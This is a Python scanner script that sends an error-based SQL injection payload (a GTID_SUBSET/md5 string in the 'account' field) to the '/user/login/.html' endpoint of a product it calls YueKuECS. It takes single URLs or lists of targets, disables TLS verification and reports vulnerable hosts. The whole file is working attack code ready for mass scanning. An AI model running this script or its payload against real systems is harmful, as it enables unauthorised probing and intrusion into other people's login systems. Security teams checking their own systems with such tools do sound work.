import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/user/login/.html")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded",
        "Priority": "u=1"
    }
    data="account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,md5(123456)))),0x7e),5597)-- HZLK"
    try:
        response = requests.post(target, verify=False, data=data,headers=headers, timeout=15)
        if response.status_code == 200 and 'result' in response.text and '~e10adc3949ba59abbe56e057f20f883e~' in response.text:
                print(f"\033[31mDiscovered:{url}: YueKuECS_userlogin_SQLInject!\033[0m")
                return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")